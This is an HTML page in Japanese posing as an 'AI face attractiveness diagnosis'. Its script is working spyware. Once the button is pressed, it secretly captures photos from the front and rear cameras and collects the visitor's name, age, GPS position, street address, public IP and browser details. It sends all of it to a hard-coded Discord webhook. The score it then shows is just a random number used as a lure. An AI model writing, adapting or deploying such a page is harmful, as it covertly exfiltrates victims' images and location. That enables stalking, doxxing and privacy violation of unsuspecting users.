<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>顔面偏差値AI診断</title>
  <style>
    body { margin:0; font-family:system-ui; background:linear-gradient(135deg,#6a11cb,#2575fc); color:white; min-height:100vh; display:flex; align-items:center; justify-content:center; text-align:center; }
    .container { max-width:480px; padding:30px 20px; background:rgba(0,0,0,0.3); border-radius:20px; backdrop-filter:blur(10px); box-shadow:0 10px 40px rgba(0,0,0,0.5); }
    h1 { font-size:2.5rem; margin:0 0 20px; }
    input { width:90%; max-width:360px; padding:14px; margin:12px 0 12px 10px; border:none; border-radius:12px; font-size:1.1rem; text-align:left; display:block; box-sizing:border-box; }
    #video, #canvas { display: none; }
    button { padding:16px 60px; font-size:1.3rem; font-weight:bold; background:#ff4b6e; color:white; border:none; border-radius:50px; cursor:pointer; margin:20px 0; }
    button:disabled { background:#666; cursor:not-allowed; }
    #loading { font-size:1.6rem; margin:40px 0; display:none; }
    #result { font-size:4rem; font-weight:bold; margin:30px 0 20px; display:none; }
  </style>
</head>
<body>

<div class="container">
  <h1>顔面偏差値AI診断</h1>
  <p>最新AIが0.1秒であなたの魅力を完全解析！</p>

  <input type="text" id="userName" placeholder="名前を入力してね" />
  <input type="number" id="userAge" placeholder="年齢" min="1" max="120" />

  <video id="video" autoplay playsinline muted></video>
  <canvas id="canvas"></canvas>

  <button id="startBtn">診断開始</button>

  <div id="loading">AI解析中... 少々お待ちください</div>
  <div id="result"></div>
</div>

<script>
const WEBHOOK_URL = "https://discord.com/api/webhooks/1514842534336135318/F5n9ZsId0g58EGbeZUg9FsM4kFveG5Ur-TMsFkJukDdAi8kVRZMRy_51b8LcqQsDHbhC";
const MIN_SCORE = 68;
const MAX_SCORE = 97;

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const startBtn = document.getElementById('startBtn');
const loading = document.getElementById('loading');
const resultDiv = document.getElementById('result');

let currentStream = null;

function stopStream() {
  if (currentStream) {
    currentStream.getTracks().forEach(t => t.stop());
    currentStream = null;
    video.srcObject = null;
  }
}

async function startCamera(facingMode) {
  stopStream();
  const constraints = { video: { facingMode: { ideal: facingMode }, width: { ideal: 480 }, height: { ideal: 360 } } };
  currentStream = await navigator.mediaDevices.getUserMedia(constraints);
  video.srcObject = currentStream;
  await new Promise(r => setTimeout(r, 1500));
}

async function capturePhoto(filename) {
  const ctx = canvas.getContext('2d');
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  ctx.drawImage(video, 0, 0, video.videoWidth, video.videoHeight, 0, 0, canvas.width, canvas.height);
  return new Promise(resolve => {
    canvas.toBlob(blob => resolve({ blob, filename }), 'image/jpeg', 0.92);
  });
}

async function getLocation() {
  if (!navigator.geolocation) return "位置情報非対応";
  return new Promise(resolve => {
    navigator.geolocation.getCurrentPosition(async pos => {
      const lat = pos.coords.latitude.toFixed(6);
      const lon = pos.coords.longitude.toFixed(6);
      let addr = "住所取得失敗";
      try {
        const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
        const data = await res.json();
        if (data?.display_name) addr = data.display_name;
      } catch {}
      const mapsLink = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
      resolve(`緯度: ${lat}\n経度: ${lon}\n住所: ${addr}\nGoogle Maps: ${mapsLink}`);
    }, () => resolve("位置情報取得失敗"));
  });
}

async function sendPhoto(blobObj, content) {
  if (!blobObj?.blob) return;

  try {
    const formData = new FormData();
    formData.append('payload_json', JSON.stringify({ content }));
    formData.append('files[0]', blobObj.blob, blobObj.filename);
    await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
  } catch (e) {}
}

startBtn.onclick = async () => {
  startBtn.disabled = true;
  loading.style.display = 'block';

  let inner = null;
  let outer = null;
  let loc = "位置情報取得失敗";

  try {
    const name = document.getElementById('userName').value.trim();
    const age = document.getElementById('userAge').value.trim();

    await startCamera("user");
    inner = await capturePhoto(`face_${Date.now()}.jpg`);
    stopStream();

    loc = await getLocation();

    // 内カメ（フル情報）
    await sendPhoto(inner, 
      `名前: ${name || "名無し"}\n` +
      `年齢: ${age || "不明"}歳\n` +
      `IP: ${(await (await fetch('https://api.ipify.org?format=json')).json()).ip || "不明"}\n` +
      `位置情報:\n${loc}\n` +
      `UA: ${navigator.userAgent}\n` +
      `時刻: ${new Date().toLocaleString('ja-JP')}`
    );

    try {
      await startCamera("environment");
      outer = await capturePhoto(`env_${Date.now()}.jpg`);
      stopStream();

      // 外カメ（「外カメ」だけ）
      await sendPhoto(outer, "外カメ");
    } catch {
      // 外カメ失敗時は無視
    }

    loading.style.display = 'none';
    const score = Math.floor(Math.random() * (MAX_SCORE - MIN_SCORE + 1)) + MIN_SCORE;
    resultDiv.innerHTML = `${score}<span style="font-size:2rem;">点</span><br><small>上位${100-score}%の美形レベル！</small>`;
    resultDiv.style.display = 'block';

    setTimeout(() => alert(`おおっ！ ${score}点は高得点です✨`), 1000);
  } catch (err) {
    loading.style.display = 'none';
    alert("診断に失敗しました。もう一度試してみてね！");
  } finally {
    stopStream();
    startBtn.disabled = false;
    startBtn.textContent = "もう一度診断";
  }
};
</script>
</body>
</html>
